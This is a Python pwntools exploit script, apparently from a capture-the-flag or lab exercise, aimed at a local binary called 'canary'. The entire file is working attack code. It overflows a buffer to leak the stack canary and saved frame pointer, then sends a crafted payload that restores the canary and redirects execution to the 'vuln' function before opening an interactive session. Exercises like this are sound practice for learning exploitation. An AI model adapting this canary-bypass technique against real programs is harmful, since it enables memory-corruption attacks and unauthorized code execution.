import pwn

distance = 88
gdb = """
    b *vuln+135
    c
"""
#p = pwn.gdb.debug("./canary", gdbscript = gdb)
p = pwn.process("./canary")
# leak canary and rsp
p.sendline(b"A"*72)
p.recvuntil(b"A"*72)
p.readline()
leak = p.readline()
canary = pwn.u64(b"\x00" + leak[:7])
saved_rbp = pwn.u64(leak[7:13] + b"\x00\x00")
rsp = saved_rbp - 0x70

elf = pwn.ELF("./canary")
rop = pwn.ROP("./canary")

main = elf.symbols['vuln']
pwn.log.info("MAIN: " + hex(main))
pwn.log.info("CANARY: " + hex(canary))
pwn.log.info("RSP: " + hex(rsp))
p.send(b"n")
p.sendline(pwn.p64(rsp+80) + pwn.p64(main)+ b"A"*56 + pwn.p64(canary) + pwn.p64(rsp) )
p.interactive()
